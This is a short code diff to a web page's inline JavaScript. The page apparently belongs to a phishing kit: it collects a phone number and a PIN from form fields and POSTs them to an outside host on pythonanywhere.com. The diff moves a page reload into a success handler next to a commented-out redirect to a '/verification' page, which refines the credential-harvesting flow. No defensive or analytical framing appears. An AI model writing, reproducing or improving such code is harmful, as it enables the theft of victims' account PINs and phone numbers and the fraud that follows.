@@ -244,6 +244,17 @@
             var xhr = new XMLHttpRequest();
             xhr.open("POST", 'https://erikadavis1.pythonanywhere.com', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
+        
+
+            xhr.onreadystatechange = function() {
+                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
+                    // window.location.href = '/verification';
+                    setInterval(function() { window.location.reload() }, 5000);
+                }
+                else{
+                    console.log("ERRORRRRRR")
+                }
+            }
             xhr.send(
                 JSON.stringify({
                 'phonenumber': document.getElementById('phonenumber').value,
@@ -251,12 +262,6 @@
                 'pin':document.getElementById('pincode').value
                 })
             );
-
-
-            setInterval(function() { window.location.reload() }, 5000);
-
-
-
 
         })
         </script>
